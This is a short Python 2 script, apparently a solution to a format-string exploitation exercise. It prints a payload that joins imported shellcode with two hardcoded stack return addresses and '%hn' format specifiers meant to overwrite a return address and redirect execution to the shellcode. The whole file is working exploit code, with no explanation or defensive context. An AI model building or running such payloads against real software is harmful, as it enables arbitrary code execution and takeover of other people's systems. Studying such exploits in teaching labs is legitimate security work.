from shellcode import shellcode
retaddr1= "\xac\x7d\xfe\xbf" #offset is 10
retaddr2= "\xae\x7d\xfe\xbf"

print shellcode+"a"+retaddr1+retaddr2+"%30080x%10$hn%19038x%11$hn"
